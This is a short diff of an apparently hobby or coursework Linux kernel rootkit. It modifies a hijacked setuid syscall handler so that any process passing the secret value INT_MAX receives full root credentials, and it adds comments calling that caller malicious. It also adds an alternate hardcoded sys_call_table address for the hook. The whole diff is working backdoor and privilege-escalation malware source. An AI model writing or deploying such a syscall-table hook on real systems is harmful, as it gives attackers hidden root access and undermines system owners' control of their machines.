@@ -128,10 +128,18 @@ out:
 }
 
 
+/*
+ * Hijacked setuid sets the ids of calling process to root if it
+ * knows the secret of rootkit i.e calling process is malicious
+ * uid: uid that needs to set or INT_MAX if uid needs to be set to 0
+ */
 asmlinkage int hijacked_setuid(uid_t uid){
 	struct cred *new;
-	if (uid == 42710){
-		printk(KERN_DEBUG "setuid called\n");
+	/*
+	 * If uid is INT_MAX, then the ids of the calling process will
+	 * be set to root (0)
+	 */
+	if (uid == INT_MAX){
 		new = prepare_creds();
                 new->uid = 0;
                 new->gid = 0;
@@ -141,8 +149,14 @@ asmlinkage int hijacked_setuid(uid_t uid){
                 new->egid = 0;
                 new->fsuid = 0;
                 new->fsgid = 0;
+		/*
+		 * Commit the new permission for calling (malicious) process
+		 */
 		return commit_creds(new);
 	}
+		/*
+		 * By default call the original setuid syscall
+		 */
 		return real_setuid(uid);
 }
 
@@ -289,6 +303,7 @@ int init_module(void){
 	after every boot, so for now it can be hardcoded.
 	*/
 	sys_call_table = (unsigned long*)0xc1688140;
+	//sys_call_table = (unsigned long*)0xc15c3060;
 	hijack_sys_call_table();	
 	
 
